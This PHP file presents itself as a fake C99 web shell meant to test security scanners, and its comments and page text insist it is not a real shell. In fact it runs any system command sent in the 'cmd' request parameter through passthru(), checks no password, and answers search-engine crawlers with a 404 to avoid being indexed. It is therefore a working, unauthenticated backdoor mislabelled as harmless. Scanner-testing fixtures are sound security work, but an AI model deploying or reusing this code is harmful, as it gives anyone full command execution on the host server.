<?php
// HIVE Test Backdoor - c99.php
// This is a FAKE backdoor for security scanner testing
// Mimics C99 shell patterns for scanner detection

$auth_pass = "c99";
$color = "#00ff00";
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = "UTF-8";

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function c99sh_surl($url) {
    return $url;
}

function c99sh_sourcecode() {
    return "C99 Shell";
}

if(isset($_REQUEST['act']) && $_REQUEST['act'] == 'cmd') {
    if(isset($_REQUEST['cmd'])) {
        echo "<pre>";
        $cmd = $_REQUEST['cmd'];
        passthru($cmd);
        echo "</pre>";
    }
}
?>
<html>
<head><title>c99shell</title></head>
<body bgcolor="#000000" text="#00ff00">
<h1>c99shell v. 2.0</h1>
<p>HIVE Test File - Not a real shell</p>
<form method="POST">
<input type="hidden" name="act" value="cmd">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
</body>
</html>
